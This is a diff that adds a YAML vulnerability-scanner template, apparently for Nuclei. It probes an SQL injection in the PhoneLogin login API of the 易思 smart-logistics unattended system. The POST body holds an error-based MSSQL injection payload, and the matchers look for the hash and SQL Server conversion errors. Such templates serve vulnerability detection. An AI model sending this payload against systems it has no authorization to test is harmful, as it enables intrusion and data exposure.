@@ -1,0 +1,30 @@
+id: poc-yaml-eosine-phonelogin-sqli
+info:
+  name: 易思智能物流无人值守系统 PhoneLogin SQL注入漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  description: |
+    易思智能物流无人值守系统的 PhoneLogin API 存在SQL注入漏洞，可导致敏感信息泄露或数据篡改。
+
+variables:
+  t1: '{{rand_int(1000, 10000)}}'
+  t2: '{{md5(t1)}}'
+
+http:
+  - method: POST
+    path:
+      - "{{BaseURL}}/api/PhoneLogin/login"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: "Account=1'%20and%20sys.fn_sqlvarbasetostr(HashBytes('MD5','{{t1}}'))=1--&Espassword=g5edid4OCFI32C5NPEZeXg=="
+    matchers-condition: and
+    matchers:
+      - type: status
+        status: [200]
+      - type: word
+        part: body
+        words:
+          - "0x{{t2}}"
+          - "转换成数据类型 int 时失败"
+          - "在将 nvarchar 值"
